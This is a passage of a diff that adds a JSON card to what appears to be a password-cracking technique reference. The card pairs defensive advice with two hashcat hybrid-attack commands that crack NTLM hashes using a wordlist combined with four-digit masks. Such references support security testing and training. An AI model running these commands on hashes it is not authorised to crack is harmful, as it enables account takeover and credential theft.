long passphrases and deny predictable numeric endings; monitor and remediate initial credential capture vectors.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hashcat -a 6 -m 1000 hashes.ntlm wordlist.txt ?d?d?d?d\nhashcat -a 7 -m 1000 hashes.ntlm ?d?d?d?d wordlist.txt</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hashcat",
+      "hybrid-attack",
+      "mask",
+      "phase:offline-crack"
+    ],
+    "color": "#eab308"
+  }
+]
